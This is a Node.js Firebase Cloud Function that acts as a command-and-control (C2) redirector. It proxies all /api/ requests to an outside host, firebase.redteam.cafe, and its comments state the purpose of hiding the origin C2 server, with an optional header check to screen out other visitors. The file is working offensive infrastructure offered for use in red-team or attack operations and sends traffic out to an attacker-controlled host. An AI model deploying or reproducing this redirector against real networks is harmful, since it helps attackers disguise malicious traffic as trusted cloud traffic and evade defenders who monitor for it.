const functions = require('firebase-functions');
const express = require('express');

const app = express();

var http = require('http'), httpProxy = require('http-proxy');


var proxy = httpProxy.createProxyServer({secure:false,xfwd:true});

/* Require a header, useful to require a particular header to access the page (helps hide origin C2) - Optional
app.use('', (req, res, next) => {
   if (req.headers.PutAUniqueHeaderHere) {
       next();
   } else {
       res.send('{ "Error": "Invalid Authentication." }');
	// You can  also do a generic 403,500,etc
    	// res.status(403);
   }
});
*/


/* your C2 must have a URI . In this case I am using /api/" */
app.all('/api/*', function(req, res, next){
    console.log(req.url);
    req.url = "/api/" + req.url.slice(5);
	console.log("Req URL:"+req.url);
    proxy.web(req, res, {
        target: 'https://firebase.redteam.cafe:443/'
    }, function(e) {
        console.log(e);
    }); 
	res.set('Cache-Control', 'no-cache, no-store');
});


exports.app = functions.https.onRequest(app);

// // Create and Deploy Your First Cloud Functions
// // https://firebase.google.com/docs/functions/write-firebase-functions
//
// exports.helloWorld = functions.https.onRequest((request, response) => {
//   functions.logger.info("Hello logs!", {structuredData: true});
//   response.send("Hello from Firebase!");
// });
